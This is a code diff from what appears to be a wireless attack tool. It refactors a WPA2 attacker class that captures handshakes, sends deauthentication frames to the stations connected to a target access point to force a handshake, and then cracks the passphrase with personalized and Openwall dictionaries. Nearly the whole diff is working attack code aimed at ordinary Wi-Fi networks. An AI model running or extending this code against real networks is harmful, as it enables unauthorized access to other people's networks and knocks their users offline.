@@ -253,16 +253,15 @@ class Wpa2Attacker(object):
             #  AP already cracked
             logger.info('Known ' + str(self.ap))
             return
-        with tempfile.TemporaryDirectory() as tmp_dirname:
-            if not self.ap.wpa_handshake_cap_path:
-                capturer = WirelessCapturer(tmp_dir=tmp_dirname, interface=self.monitoring_interface)
-                capturer.start(self.ap)
 
+        if not self.ap.wpa_handshake_cap_path:
+            with WirelessCapturer(interface=self.monitoring_interface,
+                                  ap=self.ap) as capturer:
                 while not self.ap.wpa_handshake_cap_path:
-                    capturer.update_state()
+                    capturer.update()
                     while not capturer.flags['detected_wpa_handshake']:
                         time.sleep(2)
-                        capturer.update_state()
+                        capturer.update()
                         result = capturer.get_capture_result()
                         if len(result):  # if AP was detected by capturer
                             tmp_ap = capturer.get_capture_result()[0]
@@ -272,50 +271,48 @@ class Wpa2Attacker(object):
                             for st in tmp_ap.associated_stations:
                                 deauthenticate(self.monitoring_interface, st)
                                 time.sleep(2)
-                                capturer.update_state()
+                                capturer.update()
                                 if capturer.flags['detected_wpa_handshake']:
                                     break
                         else:
                             logger.info('Network not detected by capturer yet.')
                     self.ap.save_wpa_handshake_cap(capturer.wpa_handshake_cap_path)
                     logger.info('WPA handshake detected.')
-                capturer.stop()
-                capturer.clean()
 
-            # prepare dictionaries
-            dictionaries = []
-            dictionaries += get_personalized_dictionaries(target=self.ap)  # personalized first
-            # NOTE: Dictionary 'openwall_all.lst' has been compiled by Solar Designer
-            # of Openwall Project. http://www.openwall.com/wordlists/ License is attached at 'resources/LICENSE'.
-            dictionaries.append(pkg_resources.resource_stream(__package__, 'resources/test_dictionary.lst'))
-            dictionaries.append(pkg_resources.resource_stream(__package__, 'resources/openwall_password.lst'))
+        # prepare dictionaries
+        dictionaries = []
+        dictionaries += get_personalized_dictionaries(target=self.ap)  # personalized first
+        # NOTE: Dictionary 'openwall_all.lst' has been compiled by Solar Designer
+        # of Openwall Project. http://www.openwall.com/wordlists/ License is attached at 'resources/LICENSE'.
+        dictionaries.append(pkg_resources.resource_stream(__package__, 'resources/test_dictionary.lst'))
+        dictionaries.append(pkg_resources.resource_stream(__package__, 'resources/openwall_password.lst'))
 
-            for idx, dictionary in enumerate(dictionaries):
-                try:
-                    cracker = Wpa2Cracker(ap=self.ap, dictionary=dictionary)
-                    cracker.start()
-                    while not self.ap.is_cracked():
-                        cracker.update_state()
-                        logger.debug('Wpa2Cracker: ' + str(cracker.state))
-                        time.sleep(5)
-                except PassphraseNotInDictionaryError:
-                    logger.info('Passphrase not in dictionary. ({}/{})'.format(idx + 1, len(dictionaries)))
-                finally:
-                    cracker.stop()
-                    cracker.clean()
-                    dictionary.close()
-
-                if self.ap.is_cracked():
-                    logger.info('Cracked ' + str(self.ap))
-                    break
-            else:
-                # Passphrase was not in any dictionary, otherwise the above loop would break.
-                logger.error('Passphrase not in any dictionary.')
-                raise PassphraseNotInAnyDictionaryError()
-
-            # AP is now cracked, close the dictionaries
-            for dictionary in dictionaries:
+        for idx, dictionary in enumerate(dictionaries):
+            try:
+                cracker = Wpa2Cracker(ap=self.ap, dictionary=dictionary)
+                cracker.start()
+                while not self.ap.is_cracked():
+                    cracker.update_state()
+                    logger.debug('Wpa2Cracker: ' + str(cracker.state))
+                    time.sleep(5)
+            except PassphraseNotInDictionaryError:
+                logger.info('Passphrase not in dictionary. ({}/{})'.format(idx + 1, len(dictionaries)))
+            finally:
+                cracker.stop()
+                cracker.clean()
                 dictionary.close()
+
+            if self.ap.is_cracked():
+                logger.info('Cracked ' + str(self.ap))
+                break
+        else:
+            # Passphrase was not in any dictionary, otherwise the above loop would break.
+            logger.error('Passphrase not in any dictionary.')
+            raise PassphraseNotInAnyDictionaryError()
+
+        # AP is now cracked, close the dictionaries
+        for dictionary in dictionaries:
+            dictionary.close()
 
 
 def verify_psk(ap: WirelessAccessPoint, psk: str):
